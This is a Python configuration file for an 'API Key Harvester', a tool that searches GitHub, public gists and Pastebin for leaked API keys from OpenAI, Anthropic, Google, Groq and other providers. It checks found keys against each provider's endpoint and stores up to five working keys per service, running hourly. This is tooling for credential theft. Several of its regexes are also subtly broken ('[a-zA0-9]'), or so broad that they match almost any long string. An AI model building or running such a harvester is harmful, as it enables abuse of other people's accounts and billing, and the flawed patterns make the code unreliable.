"""Configuration for API Key Harvester"""

# API patterns to search for (regex patterns)
API_PATTERNS = {
    'openai': r'sk-[a-zA-Z0-9]{48,}',
    'anthropic': r'sk-ant-[a-zA0-9]{48,}',
    'gemini': r'AIza[a-zA-Z0-9\-_]{35}',
    'groq': r'gsk_[a-zA0-9]{48,}',
    'deepseek': r'sk-[a-zA0-9]{32,}',
    'claude': r'sk-ant-[a-zA0-9]{48,}',
    'mistral': r'[a-zA0-9]{32,}',
    'cohere': r'[a-zA0-9]{40,}',
    'huggingface': r'hf_[a-zA-Z0-9]{34,}',
    'replicate': r'r8_[a-zA0-9]{40,}',
}

# Sources to search
SEARCH_SOURCES = {
    'github': {
        'enabled': True,
        'search_queries': [
            'openai api key',
            'sk- language:python',
            'AIza extension:py',
            'gsk_ language:python',
            'api key in code',
            '.env api key',
        ],
        'max_results': 50
    },
    'public_gists': {
        'enabled': True,
        'max_results': 30
    },
    'pastebin': {
        'enabled': True,
        'max_results': 20
    }
}

# Validation endpoints
VALIDATION_ENDPOINTS = {
    'openai': 'https://api.openai.com/v1/models',
    'anthropic': 'https://api.anthropic.com/v1/models',
    'gemini': 'https://generativelanguage.googleapis.com/v1/models',
    'groq': 'https://api.groq.com/openai/v1/models',
    'deepseek': 'https://api.deepseek.com/v1/models',
    'mistral': 'https://api.mistral.ai/v1/models',
}

# Storage
ENCRYPTED_KEY_FILE = 'api_harvester/storage/encrypted_keys.json'
KEY_STATS_FILE = 'api_harvester/storage/key_stats.json'
LOG_FILE = 'api_harvester/logs/harvester.log'

# Harvester settings
MAX_KEYS_PER_SERVICE = 5  # Keep max 5 working keys per service
KEY_VALIDATION_TIMEOUT = 10  # seconds
HARVEST_INTERVAL = 3600  # Run every hour
